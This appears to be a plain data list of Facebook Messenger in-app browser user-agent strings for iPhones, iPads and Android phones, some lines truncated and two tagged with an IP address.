AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/MessengerForiOS;FBAV/160.0.0.49.95;FBBV/101168249;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_2 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A421 [FBAN/MessengerForiOS;FBAV/152.0.0.37.98;FBBV/90712625;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.0.2;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/MessengerForiOS;FBAV/148.0.0.31.386;FBBV/86952252;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBAV/176.0.0.37.78;FBBV/118347320;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/MessengerForiOS;FBAV/149.0.0.34.93;FBBV/87964402;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (Linux; U; Android 4.2.2; pt-pt; RX3DC-3 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 [FB_IAB/MESSENGER;FBAV/137.0.0.15.90;]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/MessengerForiOS;FBAV/151.0.0.45.96;FBBV/90061748;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/MEO;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]
Mozilla/5.0 (Linux; Android 5.0.2; SF1 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]
Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/359.0.0.30.118;;]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/Machintosh,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/147.0.0.50.87;FBBV/84235609;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/3;FBCR/NOS;FBID/phone;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (Linux; Android 6.0.1; SM-G900W8 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/100.0.0.29.61;]
Mozilla/5.0 (Linux; U; Android 4.3; en-us; C6530N Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBID/phone;FBLC/de_DE;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/148.0.0.31.386;FBBV/86952252;FBDV/iPad6,11;FBMD/iPad;FBSN/iOS;FBSV/11.2.2;FBSS/2;FBCR/;FBID/tablet;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B410 [FBAN/MessengerForiOS;FBAV/153.0.0.47.97;FBBV/91923955;FBDV/iPad4,2;FBMD/iPad;FBSN/iPhone OS;FBSV/8.1;FBSS/2;FBCR/MegaFon;FBID/tablet;FBLC/id_ID;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/o2-de;FBID/phone;FBLC/id_ID;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/147.0.0.50.87;FBBV/84235609;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/3;FBCR/NOS;FBID/phone;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]
Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;] Mozilla/5.0 (Linux; U; Android 4.3; en-us; C6530N Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]
Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/221.1.0.15.157;] [ip:157.240.217.35]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBAV/167.0.0.57.96;FBBV/109575372;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/MegaFon;FBID/phone;FBLC/ru_RU
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/Tele2;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.2.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/12.4;FBSS/2;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/12.3.2;FBSS/3;FBCR/Beeline;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/Beeline;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/MessengerForiOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/MessengerForiOS;FBAV/11.0.0.15.14;FBBV/4026123;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/MessengerForiOS;FBAV/172.0.0.51.84;FBBV/115215338;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/3;FBCR/Beeline;FBID/phone;FBLC/ru_RU;F
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Tele2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/2;FBCR/YOTA;FBID/phone;FBLC/ru_RU;F
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/MobileTeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPad5,4;FBMD/iPad;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBCR/Beeline;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (Linux; U; Android 4.3; vi-vn; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/MESSENGER;FBAV/138.0.0.20.92;]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466 [FBAN/MessengerForiOS;FBAV/19.1.0.12.23;FBBV/6318336;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.3;FBSS/2; FBCR/MobileTeleSystems;FBID/pho
Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/58.0.0.32.81;FBBV/22628760;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/ru_R
Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/47.0.0.19.116;FBBV/17056928;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/de_
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/55.0.0.28.59;FBBV/20754519;FBDV/iPhone5,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B554a [FBAN/MessengerForiOS;FBAV/3.1.2;FBBV/1027309;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.0.4;FBSS/2; FBCR/MobileTeleSystems;FBID/phone;FB
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B511 [FBAN/MessengerForiOS;FBAV/9.1.0.15.14;FBBV/3594432;FBDV/iPhone3,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.0.3;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/ru
Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F70 [FBAN/MessengerForiOS;FBAV/85.0.0.22.69;FBBV/37013644;FBRV/0;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/
Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/99.0.0.31.139;FBBV/45331829;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Carrier;FBID/phone;FB
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/61.0.0.29.25;FBBV/24721691;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/61.0.0.29.25;FBBV/24721691;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/Beeline;FBID/phone;FBLC/r
Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/50.0.0.15.72;FBBV/17975388;FBDV/iPad2,7;FBMD/iPad;FBSN/iPhone OS;FBSV/9.1;FBSS/1; FBCR/MobileTeleSystems;FBID/tablet;FBLC/ru_RU;
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 [FBAN/MessengerForiOS;FBAV/23.1.0.15.15;FBBV/8176219;FBDV/iPad4,4;FBMD/iPad;FBSN/iPhone OS;FBSV/8.2;FBSS/2; FBCR/;FBID/tablet;FBLC/ru_RU;FBOP/1]
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/MessengerForiOS;FBAV/15.0.0.15.14;FBBV/4974699;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 [FBAN/MessengerForiOS;FBAV/64.0.0.28.84;FBBV/26403168;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.1;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/
Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/221.1.0.15.157;] [ip:213.205.242.78]
Mozilla/5.0 (iPad; CPU OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/88.0.0.27.69;FBBV/38853002;FBRV/0;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBCR/;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/br_pt;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 [FBAN/MessengerForiOS;FBAV/25.0.0.4.14;FBBV/8936291;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.2;FBSS/2; FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/120.0.0.48.70;FBBV/59774553;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/3;FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/112.0.0.36.70;FBBV/54364624;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Rogers;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/123.0.0.44.69;FBBV/62323340;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/128.0.0.43.90;FBBV/66013621;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B440 [FBAN/MessengerForiOS;FBAV/34.0.0.21.276;FBBV/13810118;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.2;FBSS/2; FBCR/Globe;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/13.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/113.0.0.38.70;FBBV/54935425;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/Ooredoo;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBID/phone;FBLC/vi_VN;FBOP/5]
